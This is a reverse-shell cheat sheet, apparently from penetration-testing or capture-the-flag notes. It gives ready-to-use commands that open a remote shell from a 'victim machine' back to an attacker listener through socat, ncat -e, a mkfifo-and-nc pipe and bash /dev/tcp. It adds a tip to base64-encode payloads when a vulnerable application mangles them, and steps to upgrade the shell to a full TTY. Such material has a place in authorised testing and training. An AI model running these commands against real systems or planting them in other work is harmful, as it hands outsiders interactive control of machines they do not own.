## Socat TTY Shell

Do this for a full socat shell, no need to upgrade it. You need socat installed or a socat static binary for this, though.

On kali:

```
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

On the victim machine:

```
./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:YOUR_IP_ADDRESS_HERE:4444
```

Once the connection is made, you probably want to increase the terminal size (run in the reverse shell on the victim machine):

```
stty rows 57 cols 211
```

## Ncat

Listen to port 8001 on attacker machine:

```
sudo nc -lnvp 8001
```

Run ncat on the victim machine:

```
ncat ATTACKER_IP_HERE 8001 -e /bin/bash
```

**Note: The command is ncat, not nc or netcat. There is a difference!**

## Mkfifo

`sh`-based mkfifo reverse shell:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP_HERE ATTACKER_PORT_HERE >/tmp/f
```

## Bash

The classic bash-based reverse shell:

```
/bin/bash -i >& /dev/tcp/TargetIP/TargetPort 0>&1
```

**Note:** If the payload doesn't work because redirection or ampersand symbols behave weird in the vulnerable application, then base64 encoding the payload often works well.

## Upgrading Normal Shells to TTY shells

### Switch From ZSH To Bash

**Warning**: This doesn't work if your attacking machine uses zsh!

You can temporarily switch to bash:

```
exec bash --login
```

You can confirm you're using bash with:

```
ps -p $$
```

### Upgrade the Shell Using Python

Run this in the reverse shell to upgrade it. Don't worry if your terminal turns weird temporarily.

```
python -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo
fg
export TERM=xterm
```

### &#x20;Upgrade the Shell Without Python

```
script -qc "/bin/bash -i" /dev/null
CTRL+Z
stty raw -echo
fg
export TERM=xterm 
```
